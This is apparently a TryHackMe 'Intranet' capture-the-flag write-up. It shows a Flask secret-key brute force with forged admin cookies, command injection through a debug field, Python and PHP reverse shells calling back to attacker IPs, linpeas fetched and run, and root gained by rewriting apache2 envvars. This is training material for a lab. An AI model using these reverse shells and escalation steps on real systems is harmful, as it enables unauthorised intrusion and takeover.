root         869  0.0  1.0 107952 20844 ?        Ssl  15:32   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         890  0.0  0.9 193500 17992 ?        Ss   15:32   0:00 /usr/sbin/apache2 -k start
root         982  0.0  0.1   7936  2120 ?        Ss   15:32   0:00 /usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
root       48826  0.0  0.0      0     0 ?        I    16:09   0:00 [kworker/1:1-mm_percpu_wq]
root       48861  0.0  0.0      0     0 ?        I    16:17   0:00 [kworker/0:0-events]
root       48957  0.0  0.0      0     0 ?        I    16:39   0:00 [kworker/1:0-cgroup_destroy]
root       48971  0.0  0.0      0     0 ?        I    16:44   0:00 [kworker/u4:0-events_unbound]
root       49001  0.0  0.0      0     0 ?        I    16:49   0:00 [kworker/u4:1-events_unbound]
root       49040  0.0  0.0      0     0 ?        I    16:55   0:00 [kworker/u4:2-events_unbound]
anders     49085  0.0  0.0   6508   656 pts/2    S+   16:56   0:00 grep --color=auto root
```









```bash
echo '/usr/bin/python3 python -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.201.41.112",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\''' > envvars
```


```bash
anders@ip-10-201-0-156:/etc/apache2$ cat envvars
cat envvars
/usr/bin/python3 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.201.41.112",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```bash
anders@ip-10-201-0-156:/etc/apache2$ sudo -l
sudo -l
Matching Defaults entries for anders on ip-10-201-0-156:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anders may run the following commands on ip-10-201-0-156:
    (ALL) NOPASSWD: /sbin/service apache2 restart
anders@ip-10-201-0-156:/etc/apache2$ 


anders@ip-10-201-0-156:/etc/apache2$ sudo /sbin/service apache2 restart
sudo /sbin/service apache2 restart
```
























<br>
<h2 align="center">/etc/passwd</h2>
<p>

- <code>root</code><br>
- <code>anders</code><br>
- <code>devops</code></p>

<img width="1348" height="579" alt="image" src="https://github.com/user-attachments/assets/59f31230-3c14-4384-b402-fd05bf8ed574" />

<br>
<h2 align="center">/proc/self/cmdline</h2>
<p>

- /usr/bin/python3/home/devops/app.py</p>

<img width="1371" height="341" alt="image" src="https://github.com/user-attachments/assets/ac8ba206-9233-4d2c-be58-6955ecb100b0" />

<h2 align="center">/home/devops/app.py</h2>
<p>

- Web Application third flag</p>

<img width="1369" height="493" alt="image" src="https://github.com/user-attachments/assets/c81bb3a4-9486-4c0d-aad6-39a0dccf3353" />

<br>
<br>
<p>1.3. What is the third web application flag?<br>
<code>THM{******************************}</code></p>

<br>
<p>

- key : secret_key_ + ######<br>
- ###### : str(random.randrange(100000,999999)<br>
- if session.get(&#34;username&#34;) == &#34;admin&#34;:<br>if request.method == &#34;POST&#34;:<br>os.system(request.form[&#34;debug&#34;])<br>return render_template(&#34;admin.html&#34;)</p>

```bash
key = &#34;secret_key_&#34; + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

def check_hacking_attempt(value):

        bad_chars = &#34;#&amp;;&#39;\&#34;&#34;
        error = &#34;&#34;

        if any(ch in bad_chars for ch in value):
                error = &#34;Hacking attempt detected! &#34;
                error += &#34;You have been logged as &#34;
                error += request.remote_addr
                return True, error

        else:
                return False, error


@app.route(&#34;/robots.txt&#34;, methods=[&#34;GET&#34;])
def robots():
        return &#34;&lt;!-- Try harder --!&gt;&#34;



@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
def root():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                return redirect(&#34;/home&#34;)


@app.route(&#34;/application&#34;, methods=[&#34;GET&#34;])
def application():
        return abort(403)


@app.route(&#34;/application/console&#34;, methods=[&#34;GET&#34;])
def console():
        return abort(403)


@app.route(&#34;/temporary&#34;, methods=[&#34;GET&#34;])
def temporary():
    return abort(403)


@app.route(&#34;/temporary/dev&#34;, methods=[&#34;GET&#34;])
def dev():
        return abort(403)


@app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def login():

        if session.get(&#34;logged_in&#34;):
                return redirect(&#34;/home&#34;)

        if request.method == &#34;POST&#34;:

                username = request.form[&#34;username&#34;]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in username).&#34;
                        return render_template(&#34;login.html&#34;, error=error)

                password = request.form[&#34;password&#34;]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in password).&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;admin@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;devops@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;anders@securesolacoders.no&#34;:
                        if password == &#34;securesolacoders2022&#34;:
                                session[&#34;username&#34;] = &#34;anders&#34;

                                global sms_code
                                sms_code = random.randrange(1000,9999)

                                return redirect(&#34;/sms&#34;)
                        
                        else:
                                error = &#34;Invalid password&#34;
                                return render_template(&#34;login.html&#34;, error=error)
                else:
                        error = &#34;Invalid username&#34;
                        return render_template(&#34;login.html&#34;, error=error)

        return render_template(&#34;login.html&#34;)



@app.route(&#34;/sms&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def sms():

        if session.get(&#34;username&#34;):
                if request.method == &#34;POST&#34;:
                        sms = request.form[&#34;sms&#34;]

                        if sms == str(sms_code):
                                session[&#34;logged_in&#34;] = True
                                return redirect(&#34;/home&#34;)
                        else:
                                error = &#34;Invalid SMS code&#34;
                                return render_template(&#34;sms.html&#34;, error=error) 


                return render_template(&#34;sms.html&#34;)
        else:
                return redirect(&#34;/login&#34;)



@app.route(&#34;/logout&#34;, methods=[&#34;GET&#34;])
def logout():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                session.clear()
                return redirect(&#34;/login&#34;)


@app.route(&#34;/home&#34;, methods=[&#34;GET&#34;])
def home():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                current_ip = request.remote_addr

                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;home.html&#34;)
                return t.render(current_ip=current_ip)


@app.route(&#34;/admin&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def admin():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if session.get(&#34;username&#34;) == &#34;admin&#34;:

                        if request.method == &#34;POST&#34;:
                                os.system(request.form[&#34;debug&#34;])
                                return render_template(&#34;admin.html&#34;)

                        current_ip = request.remote_addr
                        current_time = strftime(&#34;%Y-%m-%d %H:%M:%S&#34;, gmtime())

                        return render_template(&#34;admin.html&#34;, current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)


@app.route(&#34;/internal&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def internal():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if request.method == &#34;POST&#34;:
                        news_file = request.form[&#34;news&#34;]
                        news = open(&#34;/opt/news/{}&#34;.format(news_file)).read()
                        return render_template(&#34;internal.html&#34;, news=news)

                return render_template(&#34;internal.html&#34;)


@app.route(&#34;/external&#34;, methods=[&#34;GET&#34;])
def external():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;external.html&#34;)
                return t.render()


if __name__ == &#34;__main__&#34;:
        app.run(host=&#34;0.0.0.0&#34;, port=8080, debug=False)
```

<br>
<h2 align="center">Flask Installation</h2>

```bash
(rosana) :~/Intranet# sudo pip3 install flask-unsign
```

<h2 align="center">Wordlist . 100000 to 999999 . mylist.txt</h2>

```bash
(rosana) :~/Intranet for i in $(seq 100000 999999); do echo "secret_key_$i"; done > mylist.txt
```

```bash
(rosana) :~/Intranet# tail -n 4 mylist.txt
secret_key_999996
secret_key_999997
secret_key_999998
secret_key_999999
```

<h2 align="center">JWT from current session . sessioncookie.txt</h2>

```bash
(rosana) :~/Intranet# echo 'eyJsb2dnZWRfaW4iOnRyd********************W5kZXJzIn0.aLDGKA.1smTdr1kBmdozdXsABbPohXWavc' > sessioncookie.txt
```

<h2 align="center">Secret Key</h2>

```bash
(rosana) :~/Intranet# flask-unsign --unsign --cookie "$(cat sessioncookie.txt)" --wordlist mylist.txt
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 176512 attempts
'secret_key_xxxxxx'
```

<h2 align="center">JWT to enable admin´s session</h2>

```bash
:~/Intranet# flask-unsign --sign --cookie '{"logged_in": true, "username": "admin"}' --secret 'secret_key'
IntcImxvZ2dlZF9pblwiOiBycnVlLCBcInVzZXJuYW1lXCI6IFwiYWRtaW5cIn0i.aN02ZA.5zGKWNTWRjy-BYWYSwBDCkjTqVQ
```

eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA

<img width="1160" height="507" alt="image" src="https://github.com/user-attachments/assets/2378bf16-ef04-4064-8667-49b92eccd918" />


<img width="788" height="205" alt="image" src="https://github.com/user-attachments/assets/6d22e171-682c-4216-b3cb-89260d53ff81" />



<h2 align="center">admin</h2>
<p>

- substituted the session´s cookie<br>
- refreshed</p>
- Web Application fourth flag</p>

<img width="1267" height="342" alt="image" src="https://github.com/user-attachments/assets/9ffe43dd-c7d7-4a78-a763-e8de0f6fc487" />

<br>
<br>
<p>1.4. What is the fourth web application flag?<br>
<code>THM{********************************}</code></p>

<br>
<h2 align="center">Reverse Shell</h2>

```bash
/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xxx.xxx",52222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```bash
%2Fusr%2Fbin%2Fpython3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22xx%2Exxx%2Exxx%2Exxx%22%2C52222%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27
```

<h2 align="center">Burp´s Repeater</h2>

```bash
POST /admin HTTP/1.1
Host: xx.xxx.x.xxx:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Origin: http://xx.xxx.x.xxx:8080
Connection: keep-alive
Referer: http://xx.xxx.x.xxx:8080/internal
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA

debug=%2Fusr%2Fbin%2Fpython3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22xx%2Exxx%2Exxx%2Exxx%22%2C52222%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27
```

```bash
:~/Intranet# nc -nlvp 52222
Listening on 0.0.0.0 52222
Connection received on xx.xxx.x.xxx2 43264
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
devops@...:~$ ^Z
[3]+  Stopped                 nc -nlvp 52222
(rosana) :~/Intranet# stty raw -echo; fg
nc -nlvp 52222

devops@...:~$ export TERM=xterm
devops@...:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
devops@...:~$ pwd
/home/devops
```

```bash
devops@....:~$ ls
app.py  templates  user.txt
```

```bash
devops@...:~$ cat user.txt
THM{*****************************}
```

<img width="636" height="373" alt="image" src="https://github.com/user-attachments/assets/cf0745df-536e-439b-8217-4377f9034717" />

<br>
<br>
<p> 1.5. What is the user.txtflag?</em>.<br>
<code>THM{*****************************}</code></p>

<br>
<h2 align="center">ps aux</h2>
<p>

- /usr/sbin/apache2 -k start</p>

```bash
devops@...:~$ ps aux | grep anders
anders      1308  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1314  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1328  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1330  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1343  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1354  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1372  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1393  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1399  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
anders      1402  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apache2 -k start
devops    558122  0.0  0.0   6440   652 pts/6    R+   22:29   0:00 grep --color=auto anders
```

```bash
devops@...:/var/www/html$ ls -lah
total 12K
drwxrwxrwx 2 root root 4.0K Nov  7  2022 .
drwxr-xr-x 3 root root 4.0K Oct 16  2022 ..
-rw-r--r-- 1 root root  111 Nov  7  2022 index.html
```

<p>

-  <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php">Pentest Monkey PHP Reverse Shell</a></p>

```bash
(rosana) :~/Intranet# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

```bash
(rosana) :~/Intranet# mv php-reverse-shell.php r.php
```

```bash
devops@...:/var/www/html$ wget http://xx.xxx.xxx.xxx:8000/r.php
```

<p>
  
- intranet.thm/r.php</p>


```bash
:~/Intranet# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on ... 49096
Linux ... 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 22:46:28 up  4:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

anders@...:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/Intranet# stty raw -echo; fg
nc -nlvp 1234

anders@...:/$ export TERM=xterm
```

```bash
anders@...:/$ id
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
anders@...:/$ pwd
/
```

```bash
anders@...:/$ cd /home/anders
```

```bash
anders@...:/home/anders$ ls
user2.txt
```

```bash
anders@...:/home/anders$ cat user2.txt
THM{**********************}
```

<p>1.6. What is the user2.txt flag?<br>
<code>THM{**********************}</code></p>

<br>

<h1 align="center">Root</h1>

```bash
anders@...:/$ wget http://xx.xx.xx.xx:8000/linpeas.sh
```

```bash
anders@...:/$ chmod +x linpeas.sh
```

```bash
anders@...:/$ ./linpeas.sh
```

<img width="1220" height="615" alt="image" src="https://github.com/user-attachments/assets/bcb005ad-0634-45d3-8df6-ff7180d5e5db" />

<br>
<br>

```bash
anders@...:/$ sudo -l
Matching Defaults entries for anders on ...:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anders may run the following commands on ...:
    (ALL) NOPASSWD: /sbin/service apache2 restart
```

```bash
echo 'python -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xxx.xxx",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\''' > envvars
```

```bash
anders@...:/etc/apache2$ echo 'python -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xxx.xxx",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\''' > envvars
```

```bash
anders@...:/etc/apache2$ cat envvars
```

```bash
anders@...:/etc/apache2$ sudo /sbin/service apache2 restart
```

<img width="1168" height="771" alt="image" src="https://github.com/user-attachments/assets/657ae7d1-bb50-49b2-a1fc-b55adc19d6f6" />

<br>
<br>

<p>1.7. What is the root.txtflag?<br>
<code>______________}/code></p>


<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src=""><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/b69e9fbb-001b-4165-940e-65ebb0aa6a6d"></p>


<br>
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 28   | 479      |     112ⁿᵈ    |      5ᵗʰ     |     224ᵗʰ   |     5ᵗʰ    | 123,248  |    931    |    73     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/b25befda-3f32-49b2-8903-44723346fbd4" />


<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/c6fdc6ac-36e9-440b-b281-ab4c1e1cbfd3"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/1dfcfc9a-63b7-425f-98fc-be79c2c930d1"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7f18da7a-ee84-4032-bb7c-d8d755f298af"><br>
                  Global monthly:    224ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2ff1868d-4672-4e21-aea6-67eac7311e5f"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c3baf24c-9424-4b92-8a2f-08160492880a"><br>

<br>
<br>

<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
